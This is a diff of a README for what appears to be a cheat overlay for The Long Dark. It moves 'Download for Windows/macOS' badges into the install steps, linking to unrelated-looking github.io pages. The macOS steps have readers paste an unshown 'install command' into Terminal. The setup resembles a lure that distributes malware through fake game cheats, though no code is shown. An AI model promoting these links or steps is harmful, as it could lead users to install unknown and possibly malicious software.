@@ -45,10 +45,14 @@
 5. 🎮 Launch **The Long Dark** and enter a match
 6. 📋 Press **INSERT** to open the overlay menu
 
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+
 ### macOS
 1. Press ⌘ + Space, open **Terminal**
 2. Paste the install command and press Enter
 3. Follow the on-screen prompts
+
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 
 **Menu Controls**
 
@@ -70,20 +74,6 @@
 | RAM | 8 GB | 8 GB+ |
 | Storage | 200 MB | 300 MB |
 | Game | The Long Dark (latest) | The Long Dark (latest) |
-
----
-
-## 📥 Download
-
-<p align="center">
-  <a href="https://beatowlrouse.github.io/windownload/">
-    <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows" />
-  </a>
-  &nbsp;&nbsp;
-  <a href="https://beatowlrouse.github.io/macdownload/">
-    <img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download macOS" />
-  </a>
-</p>
 
 ---
 
